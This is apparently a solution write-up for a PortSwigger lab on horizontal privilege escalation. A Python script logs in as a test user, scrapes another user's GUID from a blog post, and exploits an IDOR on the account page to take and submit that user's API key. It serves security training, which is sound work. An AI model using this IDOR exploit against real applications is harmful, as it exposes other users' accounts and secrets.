# User ID controlled by request parameter, with unpredictable user IDs

> This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.
> To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
import sys
from bs4 import BeautifulSoup

BASE_URL = "https://0ad3002e04cc794980ec171000bd0042.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    
    # 1. Login Phase
    login_url = f"{url}login"
    print(f"[*] Fetching CSRF and logging in: {login_url}")
    
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    creds = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    login_resp = session.post(login_url, data=creds)
    
    if "Log out" in login_resp.text:
        print("[+] Login Successful.")
        
        # 2. Reconnaissance Phase: Find Carlos's GUID
        # We check a specific post (ID 9) where Carlos is known to be the author
        post_endpoint = f"{url}post"
        params = {"postId": 9}
        
        print("[*] Checking blog post for Carlos's GUID...")
        response = session.get(post_endpoint, params=params)
        
        if "carlos" in response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract GUID from the 'href' attribute (format: /blogs?userId=GUID)
            author_link = soup.find("span", id="blog-author").find('a').get('href')
            carlos_guid = author_link.split("=")[1].strip()
            
            print(f"[+] Found GUID: {carlos_guid}")
            
            # 3. Exploitation Phase: IDOR
            my_account_url = f"{url}my-account"
            payload = {"id": carlos_guid}
            
            print(f"[*] Accessing Carlos's account page...")
            account_resp = session.get(my_account_url, params=payload)
            
            # Extract API Key
            soup = BeautifulSoup(account_resp.text, 'html.parser')
            api_key = soup.find("div", id="account-content").find('div').text.split(":")[1].strip()
            print(f"[+] Extracted API Key: {api_key}")
            
            # 4. Submission Phase
            submit_url = f"{url}submitSolution"
            print("[*] Submitting solution...")
            
            submit_resp = session.post(submit_url, data={"answer": api_key})
            
            if "true" in submit_resp.text or "Congratulations" in submit_resp.text:
                print("[+] SUCCESSFULL: Lab Solved.")
    else:
        print("[-] Login Failed.")

if __name__ == "__main__":
    exploit(BASE_URL)
```